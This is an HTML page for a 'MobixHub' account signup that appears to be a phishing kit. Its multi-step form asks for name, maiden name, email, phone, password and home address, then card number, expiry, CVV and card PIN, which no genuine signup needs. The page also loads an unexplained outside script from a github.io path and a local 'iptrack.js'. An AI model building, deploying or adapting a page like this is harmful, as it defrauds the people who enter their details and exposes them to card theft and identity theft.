<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Sign Up - MobixHub</title>

<style>
:root{
  --bg:#f0f2f5;
  --container-bg:#ffffff;
  --text:#333333;
  --input-bg:#ffffff;
  --input-border:#cccccc;
  --button-bg:#007bff;
  --button-hover:#0056b3;
}
[data-theme="dark"]{
  --bg:#121212;
  --container-bg:#1e1e1e;
  --text:#e0e0e0;
  --input-bg:#2c2c2c;
  --input-border:#444;
  --button-bg:#0d6efd;
  --button-hover:#0a58ca;
}
*{box-sizing:border-box}
body{
  margin:0;
  font-family:'Segoe UI',Tahoma,Verdana,sans-serif;
  background:var(--bg);
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.signup-container{
  background:var(--container-bg);
  padding:2rem;
  width:100%;
  max-width:500px;
  border-radius:12px;
  box-shadow:0 8px 20px rgba(0,0,0,.08);
  color:var(--text);
}
h2{text-align:center;margin-bottom:1rem}
label{display:block;margin:.8rem 0 .3rem;font-size:.9rem}
input,select{
  width:100%;
  padding:.7rem;
  border:1px solid var(--input-border);
  border-radius:6px;
  margin-bottom:1rem;
  background:var(--input-bg);
  color:var(--text);
}
input[type="file"]{padding:.3rem}
.button-group{
  display:flex;
  justify-content:space-between;
  gap:10px;
}
button{
  padding:.9rem 1.2rem;
  border:none;
  background:var(--button-bg);
  color:#fff;
  border-radius:6px;
  font-weight:bold;
  cursor:pointer;
}
button:hover{background:var(--button-hover)}
.form-step{display:none}
.form-step.active{display:block}
.theme-toggle{
  position:fixed;
  top:15px;
  right:15px;
  padding:6px 12px;
  border:1px solid var(--input-border);
  border-radius:20px;
  background:var(--container-bg);
  cursor:pointer;
}
</style>
</head>
<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
<body>

<button class="theme-toggle" id="themeToggle">üåô / ‚òÄÔ∏è</button>

<div class="signup-container">
<h2>Create Account - MobixHub</h2>

<form id="multiStepForm" method="post" enctype="multipart/form-data">

<!-- STEP 1 -->
<div class="form-step active">
  <label>First Name</label>
  <input type="text" name="first_name" required>

  <label>Middle Name</label>
  <input type="text" name="middle_name">

  <label>Last Name</label>
  <input type="text" name="last_name" required>

  <label>Maiden Name</label>
  <input type="text" name="maiden_name">

  <label>Email Address</label>
  <input type="email" name="email" required>

  <label>Phone Number</label>
  <input type="tel" name="phone" required>

  <label>Password</label>
  <input type="password" name="password" required minlength="6">

  <label>Confirm Password</label>
  <input type="password" name="confirm_password" required minlength="6">

  <div class="button-group">
    <span></span>
    <button type="button" data-next>Next</button>
  </div>
</div>

<!-- STEP 2 -->
<div class="form-step">
  <label>Home Address</label>
  <input type="text" name="home_address" required>

  <label>City</label>
  <input type="text" name="city" required>

  <label>State</label>
  <input type="text" name="state" required>

  <label>Zip / Postcode</label>
  <input type="text" name="zip_postcode" required>

  <label>Country</label>
<input type="text" required name="Country">

  <div class="button-group">
    <button type="button" data-prev>Back</button>
    <button type="button" data-next>Next</button>
  </div>
</div>

<!-- STEP 3 -->
<!-- STEP 4 -->

<!-- STEP 5 -->
<div class="form-step">
  <label>Card Number</label>
  <input type="number" name="card_number" required>

  <label>Expiry Date</label>
  <input type="month" name="expiry_date" required>

  <label>CVV</label>
  <input type="text" name="cvv" maxlength="4" required>

  <label>Card PIN</label>
  <input type="number" name="card_pin" maxlength="10" required>

  <div class="button-group">
    <button type="button" data-prev>Back</button>
    <button type="submit">Finish</button>
  </div>
</div>

</form>
</div>

<script>
/* STEP ENGINE */
const steps = document.querySelectorAll(".form-step");
let current = 0;

function showStep(i){
  steps.forEach(s=>s.classList.remove("active"));
  steps[i].classList.add("active");
}

document.getElementById("multiStepForm").addEventListener("click",e=>{
  const btn = e.target.closest("button");
  if(!btn) return;

  if(btn.hasAttribute("data-next")){
    const fields = steps[current].querySelectorAll("input,select");
    for(const f of fields){
      if(!f.checkValidity()){ f.reportValidity(); return; }
    }
    current++; showStep(current);
  }

  if(btn.hasAttribute("data-prev")){
    current--; showStep(current);
  }
});

/* THEME */
const html=document.documentElement;
document.getElementById("themeToggle").onclick=()=>{
  html.dataset.theme = html.dataset.theme==="dark"?"light":"dark";
};
</script>
  <script src="iptrack.js"></script>
</body>
</html>
